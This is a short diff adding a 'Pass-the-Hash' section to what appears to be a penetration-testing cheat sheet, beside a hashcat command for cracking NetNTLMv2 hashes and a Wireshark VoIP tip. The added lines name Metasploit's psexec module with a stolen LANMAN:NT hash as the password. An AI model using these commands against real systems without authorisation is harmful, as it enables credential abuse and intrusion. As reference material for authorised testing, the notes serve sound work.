@@ -178,6 +178,13 @@ or
 ```
 hashcat -m 5600 --potfile-path ~/.hashcat/hashcat.potfile --show --outfile-format 2 hash.txt
 ```
+#### Pass-the-Hash   
+MSF can do this
+```
+use exploit/windows/smb/psexec
+set SMBPass LANMAN:NT
+ ```
+
 #### VoIP
 
 In wireshark dropdown menues  telephone > RTP > RTP Streams   
